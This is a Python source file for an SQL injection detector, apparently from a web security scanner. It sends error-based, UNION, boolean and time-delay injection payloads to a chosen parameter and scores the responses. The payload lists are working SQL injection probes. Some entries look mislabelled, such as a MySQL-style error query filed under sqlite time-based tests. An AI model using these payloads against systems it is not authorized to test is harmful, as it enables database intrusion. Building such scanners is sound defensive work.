import time

class SQLiDetector:
    PAYLOADS = [
        "'", '"',
        "' OR 1=1--", '" OR 1=1--',
        "' OR 'a'='a", '" OR \"a\"=\"a"',
        "') OR ('1'='1", '" ) OR ("1"="1',
        "' OR 1=1#", '" OR 1=1#',
        "' OR 1=1/*", '" OR 1=1/*',
        "' UNION SELECT NULL--", '" UNION SELECT NULL--'
    ]

    # Union-based payloads for in-band SQLi
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        '" UNION SELECT NULL--',
        "') UNION SELECT NULL--"
    ]

    # Time-based blind SQLi payloads
    TIME_BASED_PAYLOADS = {
        "mysql": ["' AND SLEEP(5)--", "' OR SLEEP(5)--", "' AND BENCHMARK(5000000,MD5('A'))--"],
        "postgres": ["' AND pg_sleep(5)--", "'; SELECT pg_sleep(5)--"],
        "mssql": ["' WAITFOR DELAY '0:0:5'--", "'; WAITFOR DELAY '0:0:5'--"],
        "sqlite": ["' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CHAR(124)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"],
        "oracle": ["' AND DBMS_LOCK.SLEEP(5)--"]
    }

    BOOLEAN_PAIRS = [
        ("1' AND '1'='1", "1' AND '1'='2"),
        ('1" AND "1"="1', '1" AND "1"="2'),
        ("1' AND 1=1--", "1' AND 1=2--"),
        ('1" AND 1=1--', '1" AND 1=2--')
    ]

    ERROR_SIGNATURES = [
        "sql syntax", "mysql", "syntax error", "unterminated",
        "sqlite", "pg_query", "fatal error", "odbc",
        "you have an error", "warning:", "psql:", "ora-",
        "microsoft ole db", "unclosed quotation", "quoted string not properly terminated",
        "sqlstate", "native client", "jdbc", "db2 sql error"
    ]

    DB_SIGNATURES = {
        "mysql": ["mysql", "mariadb", "you have an error in your sql syntax", "warning: mysql"],
        "postgres": ["postgresql", "pg_query", "psql:", "pg::"],
        "mssql": ["microsoft sql server", "sql server", "odbc sql server", "native client"],
        "sqlite": ["sqlite", "sqlite3"],
        "oracle": ["ora-", "oracle"]
    }

    VERSION_REGEX = [
        r"mysql\s*server\s*version[:\s]*([0-9.]+)",
        r"mariadb\s*server\s*version[:\s]*([0-9.]+)",
        r"postgresql\s*([0-9.]+)",
        r"sql\s*server\s*([0-9.]+)",
        r"sqlite\s*version[:\s]*([0-9.]+)",
        r"oracle\s*database\s*([0-9.]+)"
    ]

    DB_SPECIFIC_PAYLOADS = {
        "mysql": ["' AND EXTRACTVALUE(1, CONCAT(0x7e, 1))--", "' AND UPDATEXML(1, CONCAT(0x7e, 1), 1)--"],
        "postgres": ["' AND 1=CAST(version() AS INT)--", "' AND 1=CAST(current_database() AS INT)--"],
        "mssql": ["' AND 1=CONVERT(INT, @@version)--", "' AND 1=CONVERT(INT, DB_NAME())--"],
        "sqlite": ["' AND 1=CAST(sqlite_version() AS INT)--"],
        "oracle": ["' AND 1=TO_NUMBER(DBMS_UTILITY.SQLID_TO_SQLHASH('a'))--"]
    }

    LEAK_PATTERNS = [
        r"unknown column ['\"]?([a-z0-9_]+)['\"]?",
        r"column ['\"]?([a-z0-9_]+)['\"]? does not exist",
        r"table ['\"]?([a-z0-9_]+)['\"]? doesn't exist",
        r"relation ['\"]?([a-z0-9_]+)['\"]? does not exist",
        r"ora-00942: table or view does not exist",
        r"invalid column name ['\"]?([a-z0-9_]+)['\"]?"
    ]

    def __init__(self, client):
        self.client = client

    def test(self, path, param):
        # Baseline for boolean-based checks
        baseline = self.client.get(path, params={param: "1"})
        baseline_text = baseline.text if baseline else ""
        baseline_len = len(baseline_text)

        # 1) IN-BAND SQLi - Error-based detection via generic payloads
        for payload in self.PAYLOADS:
            res = self.client.get(path, params={param: payload})
            db_info = self._detect_db_info(res.text if res else "")
            if any(err in res.text.lower() for err in self.ERROR_SIGNATURES):
                return {
                    "type": "sqli",
                    "sqli_type": "in-band (error-based)",
                    "endpoint": path,
                    "param": param,
                    "payload": payload,
                    "evidence": f"SQL error message detected{db_info}",
                    "confidence": 0.9,
                    "description": "Error-based SQLi: SQL errors are visible in the response, allowing direct extraction of data"
                }

        # 2) IN-BAND SQLi - Union-based detection
        union_result = self._test_union_based(path, param)
        if union_result:
            return union_result

        # 3) DB-specific payloads if DB identified from baseline
        db_hint = self._detect_db_from_text(baseline_text)
        if db_hint in self.DB_SPECIFIC_PAYLOADS:
            for payload in self.DB_SPECIFIC_PAYLOADS[db_hint]:
                res = self.client.get(path, params={param: payload})
                db_info = self._detect_db_info(res.text if res else "")
                if any(err in (res.text or "").lower() for err in self.ERROR_SIGNATURES):
                    return {
                        "type": "sqli",
                        "sqli_type": "in-band (error-based)",
                        "endpoint": path,
                        "param": param,
                        "payload": payload,
                        "evidence": f"DB-specific error triggered{db_info}",
                        "confidence": 0.85,
                        "description": "Error-based SQLi: Database-specific payload triggered SQL error"
                    }

        # 4) Database contents leakage signals (table/column names)
        leak = self._detect_leak(baseline_text)
        if leak:
            return {
                "type": "sqli",
                "sqli_type": "in-band (error-based)",
                "endpoint": path,
                "param": param,
                "payload": "(baseline)",
                "evidence": f"Potential schema leakage detected: {leak}",
                "confidence": 0.7,
                "description": "Error-based SQLi: Database schema information leaked in error messages"
            }

        # 5) BLIND SQLi - Boolean-based detection
        boolean_result = self._test_boolean_based(path, param, baseline_len)
        if boolean_result:
            return boolean_result

        # 6) BLIND SQLi - Time-based detection
        time_result = self._test_time_based(path, param, db_hint)
        if time_result:
            return time_result

        return None

    def _test_union_based(self, path, param):
        """Test for Union-based SQL injection (in-band)"""
        for payload in self.UNION_PAYLOADS:
            res = self.client.get(path, params={param: payload})
            if not res:
                continue
            
            text = (res.text or "").lower()
            
            # Look for UNION success indicators
            if "union" not in text and any(sig in text for sig in ["null", "column", "select"]):
                # Successful UNION might show data or column count issues
                if any(err in text for err in self.ERROR_SIGNATURES):
                    db_info = self._detect_db_info(res.text or "")
                    return {
                        "type": "sqli",
                        "sqli_type": "in-band (union-based)",
                        "endpoint": path,
                        "param": param,
                        "payload": payload,
                        "evidence": f"UNION-based SQLi detected via column enumeration{db_info}",
                        "confidence": 0.85,
                        "description": "Union-based SQLi: UNION queries can be used to extract data from other tables"
                    }
        return None

    def _test_boolean_based(self, path, param, baseline_len):
        """Test for Boolean-based blind SQL injection"""
        for true_payload, false_payload in self.BOOLEAN_PAIRS:
            res_true = self.client.get(path, params={param: true_payload})
            res_false = self.client.get(path, params={param: false_payload})

            if not res_true or not res_false:
                continue

            len_true = len(res_true.text or "")
            len_false = len(res_false.text or "")

            if baseline_len > 0:
                delta_true = abs(len_true - baseline_len) / baseline_len
                delta_false = abs(len_false - baseline_len) / baseline_len
            else:
                delta_true = abs(len_true - len_false)
                delta_false = delta_true

            # Check for significant response differences
            if delta_true >= 0.15 and delta_false >= 0.15 and abs(len_true - len_false) >= max(50, baseline_len * 0.1):
                return {
                    "type": "sqli",
                    "sqli_type": "blind (boolean-based)",
                    "endpoint": path,
                    "param": param,
                    "payload": f"{true_payload} / {false_payload}",
                    "evidence": f"Response length differs: TRUE={len_true}, FALSE={len_false}, baseline={baseline_len}",
                    "confidence": 0.75,
                    "description": "Boolean-based blind SQLi: Application behavior differs based on TRUE/FALSE SQL conditions"
                }
        return None

    def _test_time_based(self, path, param, db_hint=None):
        """Test for Time-based blind SQL injection"""
        # If we know the DB type, use specific payloads
        dbs_to_test = [db_hint] if db_hint and db_hint in self.TIME_BASED_PAYLOADS else ["mysql", "postgres", "mssql"]
        
        for db_type in dbs_to_test:
            if db_type not in self.TIME_BASED_PAYLOADS:
                continue
                
            for payload in self.TIME_BASED_PAYLOADS[db_type][:2]:  # Test first 2 payloads per DB
                # Measure baseline response time
                start_baseline = time.time()
                self.client.get(path, params={param: "1"})
                baseline_time = time.time() - start_baseline

                # Test time-delay payload
                start_time = time.time()
                self.client.get(path, params={param: payload})
                elapsed_time = time.time() - start_time

                # If response takes significantly longer (at least 4 seconds more than baseline)
                if elapsed_time - baseline_time >= 4.0:
                    return {
                        "type": "sqli",
                        "sqli_type": "blind (time-based)",
                        "endpoint": path,
                        "param": param,
                        "payload": payload,
                        "evidence": f"Time delay detected: {elapsed_time:.2f}s vs baseline {baseline_time:.2f}s (DB: {db_type})",
                        "confidence": 0.85,
                        "description": "Time-based blind SQLi: Database delays can be triggered, allowing data extraction bit by bit"
                    }
        return None

    def _detect_db_info(self, text):
        if not text:
            return ""
        lower = text.lower()
        db = self._detect_db_from_text(text)
        version = self._extract_version(lower)
        parts = []
        if db:
            parts.append(f"db={db}")
        if version:
            parts.append(f"version={version}")
        return f" ({', '.join(parts)})" if parts else ""

    def _detect_db_from_text(self, text):
        lower = (text or "").lower()
        for db, sigs in self.DB_SIGNATURES.items():
            if any(sig in lower for sig in sigs):
                return db
        return ""

    def _extract_version(self, lower_text):
        try:
            import re
            for pattern in self.VERSION_REGEX:
                match = re.search(pattern, lower_text)
                if match:
                    return match.group(1)
        except Exception:
            return ""
        return ""

    def _detect_leak(self, text):
        try:
            import re
            lower = (text or "").lower()
            for pattern in self.LEAK_PATTERNS:
                match = re.search(pattern, lower)
                if match:
                    return match.group(0)
        except Exception:
            return ""
        return ""
